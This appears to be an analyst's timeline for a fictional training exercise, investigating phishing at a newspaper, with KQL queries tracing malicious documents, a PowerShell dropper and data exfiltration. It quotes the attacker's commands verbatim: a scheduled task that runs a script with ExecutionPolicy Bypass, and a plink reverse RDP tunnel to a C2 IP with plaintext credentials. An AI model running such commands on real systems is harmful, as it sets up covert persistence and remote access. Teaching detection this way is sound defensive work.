# Timeline
## 1/5/2024, 9:42:05 AM
**Action:** Sonia Gose got suspicious email
**Tool/Command:** 
```
Email
| where sender == "newspaper_jobs@gmail.com" and recipient == "sonia_gose@valdoriantimes.news"
```
**Observation (facts):** Email was sent from `newspaper_jobs@gmail.com` with suspicious link
**Interpretation (analysis):**  Sonia says she didn't click any links in the email.
**Evidence IDs:** [E-002 – Suspicious email to Sonia Gose](evidence/E-002_Suspicious_email_to_Sonia_Gose.md)
## 1/5/2024, 10:23:17 AM
**Action:**  Sonia clicked link from phishing email
**Tool/Command:** 
```
// Get IP address of Sonia
Employees
| where name == "Sonia Gose"

// Check if Sonia clicked the link
OutboundNetworkEvents
| where src_ip == "10.10.0.3"
| where url contains "promotionrecruit.com"
```
**Observation (facts):**  Sonia clicked the link which led to downloading possibly malicious file named "Valdorian_Times_Editorial_Offer_Letter.docx"
**Evidence IDs:** [E-002 – Suspicious email to Sonia Gose](evidence/E-002_Suspicious_email_to_Sonia_Gose.md)
## 1/5/2024, 10:24:04 AM
**Action:** Malicious file was downloaded to Sonia's machine
**Tool/Command:** 
```
FileCreationEvents
| where hostname == "UL0M-MACHINE"
| where filename == "Valdorian_Times_Editorial_Offer_Letter.docx"
```
**Observation (facts):** File name: "Valdorian_Times_Editorial_Offer_Letter.docx"
Infected machine: "UL0M-MACHINE"
## 1/5/2024, 10:24:32 AM
**Action:** File was written to disk after docx was downloaded
**Tool/Command:** 
```
// See what process this file created
ProcessEvents
| where hostname == "UL0M-MACHINE"
| where process_commandline contains "Valdorian"
// Found process_name == "WINWORD.EXE"

// See if this process created other processes
ProcessEvents
| where hostname == "UL0M-MACHINE"
| where parent_process_name == "WINWORD.EXE"
// Found process_name == "hacktivist_manifesto.ps1"
```
**Observation (facts):**  After file analysis it was clear that "hacktivist_manifesto.ps1" script is to invoke "plink.exe" and run it. Plink then 
**Interpretation (analysis):** plink.exe is a command-line tool that lets you connect to remote server over SSH, Telnet or serial. It is often used to run commands or scripts on remote machines non-interactively.
**Evidence IDs:** [E-003 – hacktivist_manifesto.ps1](evidence/E-003_hacktivist_manifesto_ps1.md)
## 1/5/2024, 11:22:44 AM
**Action:** Scheduled task was created with ExecutionPolicy Bypass
**Tool/Command:** 
```
ProcessEvents
| where process_commandline contains "hacktivist_manifesto.ps1"
| where hostname == "UL0M-MACHINE"
```
**Observation (facts):**  Command used: schtasks /create /sc hourly /mo 5 /tn "Hacktivist Manifesto" /tr "powershell.exe -ExecutionPolicy Bypass -File C:\ProgramData\hacktivist_manifesto.ps1"
**Evidence IDs:** [E-004 – Scheduled task created](evidence/E-004_Scheduled_task_created.md)
## 1/5/2024, 11:55:22 AM
**Action:** PowerShell script executed.
**Observation (facts):** process_commandline == "powershell.exe -ExecutionPolicy Bypass -File C:\ProgramData\hacktivist_manifesto.ps1"
**Interpretation (analysis):** Script contained SSH username "$had0w" and password "thruthW!llS3tUfree"
**Evidence IDs:** [E-003 – hacktivist_manifesto.ps1](evidence/E-003_hacktivist_manifesto_ps1.md)
## 1/6/2024, 2:39:35 AM
**Action:**  Host "UL0M-MACHINE" connected to C2 server
**Tool/Command:** 
```
ProcessEvents
| where process_commandline contains "plink.exe"
| where hostname == "UL0M-MACHINE"
```
**Observation (facts):** Command successfully executed, remote connection to C2 server initiated.
**Interpretation (analysis):** process_commandline == "plink.exe -R 3389:localhost:3389 -ssh -l $had0w -pw thruthW!llS3tUfree 136.130.190.181"
**Evidence IDs:** [E-003 – hacktivist_manifesto.ps1](evidence/E-003_hacktivist_manifesto_ps1.md), [E-005 – Adversarys C2 server](evidence/E-005_Adversarys_C2_server.md)

--- 
New information was provided: *Another suspicious email  address  `valdorias_best_recruiter@gmail.com` was seen sending emails to intern Ronnie and a few others.*
## 1/10/2024, 8:48:16 AM
**Action:** Intern Ronnie got email from suspicious email `valdorias_best_recruiter@gmail.com`
**Tool/Command:**
```
Email
| where sender == "valdorias_best_recruiter@gmail.com" and recipient == "ronnie_mclovin@valdoriantimes.news"
```
**Evidence IDs:** [E-006 – Suspicious email](evidence/E-006_Suspicious_email.md)
## 1/10/2024, 8:55:07 AM
**Action:** Ronnie clicked a link on email
**Tool/Command:**
```
let ronnies_ip =
Employees
| where name == "Ronnie McLovin"
| distinct ip_addr;
OutboundNetworkEvents
| where src_ip in (ronnies_ip)
| where url contains "promotionrecruit.org"
```
**Observation (facts):** URL that was clicked: `https://promotionrecruit.org/share/Editorial_J0b_Openings_2024.docx`
**Evidence IDs:** [E-006 – Suspicious email](evidence/E-006_Suspicious_email.md)
## 1/10/2024, 8:55:17 AM
**Action:** Suspicious file was downloaded to Ronnie's machine
**Tool/Command:**
```
let ronnies_host =
Employees
| where name == "Ronnie McLovin"
| distinct hostname;
FileCreationEvents
| where filename == "Editorial_J0b_Openings_2024.docx"
| where hostname in (ronnies_host)
```
**Observation (facts):** File name: Editorial_J0b_Openings_2024.docx
## 1/10/2024, 8:55:50 AM
**Action:** File "hacktivist_manifesto.ps1" was written to disk after docx was downloaded
**Tool/Command:** 
```
// See what process this file created
ProcessEvents
| where process_commandline contains "Editorial_J0b_Openings_2024.docx"
| where hostname == "A37A-DESKTOP"

// See if this process created other processes
ProcessEvents
| where hostname == "A37A-DESKTOP"
| where parent_process_name == "WINWORD.EXE"
// Found process_name == "hacktivist_manifesto.ps1"
```
**Observation (facts):** Pattern is the same as on Sonia's machine.
## 1/11/2024, 3:08:12 AM
**Action:** Remote connection initiated to C2 server from Ronnie's machine
**Tool/Command:** 
```
ProcessEvents
| where hostname == "A37A-DESKTOP"
| where process_commandline contains "plink.exe"
```
**Observation (facts):** "plink.exe" was used again to connect to second C2 server.
**Evidence IDs:** [E-007 – Adversarys second C2 server](evidence/E-007_Adversarys_second_C2_server.md)

---
My investigative buddy, who was also looking at Ronnie's machine, saw a weird file `fakestory.docx` being downloaded from a suspicious domain.
## 1/31/2024, 9:47:51 AM
**Action:** Weird file `fakestory.docx` was downloaded to Ronnie's machine.
**Tool/Command:** 
```
let ronnies_ip =
Employees
| where name == "Ronnie McLovin"
| distinct ip_addr;
OutboundNetworkEvents
| where src_ip in (ronnies_ip)
| where url contains "fakestory.docx"

FileCreationEvents
| where hostname == "A37A-DESKTOP"
| where filename == "fakestory.docx"
```
**Observation (facts):** Suspicious URL: `https://hire-recruit.org/files/fakescandal/2024/fakestory.docx`
**Evidence IDs:** [E-008 – Suspicious file fakestory_docx](evidence/E-008_Suspicious_file_fakestory_docx.md)
## 1/31/2024, 10:26:20 AM
**Action:** Attacker moved and renamed file
**Tool/Command:** 
```
ProcessEvents
| where hostname == "A37A-DESKTOP"
| where process_commandline contains "fakestory.docx"
```
**Observation (facts):** New file name: "OpEdFinal_to_print.docx"
New file location: C:\Users\romclovin\Documents\OpEdFinal_to_print.docx
**Evidence IDs:** [E-008 – Suspicious file fakestory_docx](evidence/E-008_Suspicious_file_fakestory_docx.md)
## 1/31/2024, 11:11:12 AM
**Action:** Clark Kent got email with fake final print
**Tool/Command:** 
```
Email
| where sender == "ronnie_mclovin@valdoriantimes.news" and recipient == "clark_kent@valdoriantimes.news"
| where link contains "OpEdFinal_to_print.docx"
```
**Observation (facts):** Email was sent from Ronnie McLovin with final print
**Evidence IDs:** [E-001 – Email to Clark Kent](evidence/E-001_Email_to_Clark_Kent.md)

---
In the middle of your investigation, `Ronnie` finds you and shows you an alert ([[E-009 - Dark Web Monitoring Alert]]) she received from her dark web monitoring service.
## 1/31/2024, 11:44:58 AM
**Action:** After renaming `fakestory.docx` to `OpEdFinal_to_print.docx`, the attackers ran commands to archive data from Ronnie's machine.
**Tool/Command:** 
```
ProcessEvents
| where hostname == "A37A-DESKTOP"
| where process_commandline contains ".7z"
```
**Observation (facts):** Archived all `*.docx` files from Desktop and Documents folders.
**Evidence IDs:** [E-009 – Dark Web Monitoring Alert](evidence/E-009_Dark_Web_Monitoring_Alert.md), [E-010 – Exfiltrated data from Ronnies machine](evidence/E-010_Exfiltrated_data_from_Ronnies_machine.md)
## 2/1/2024, 2:14:32 AM
**Action:** Archived files exfiltrated
**Observation (facts):** Exfiltrated to a custom portal on their website. URL: `https://hirejob.com/exfil_processor/upload.php`
**Evidence IDs:** [E-010 – Exfiltrated data from Ronnies machine](evidence/E-010_Exfiltrated_data_from_Ronnies_machine.md)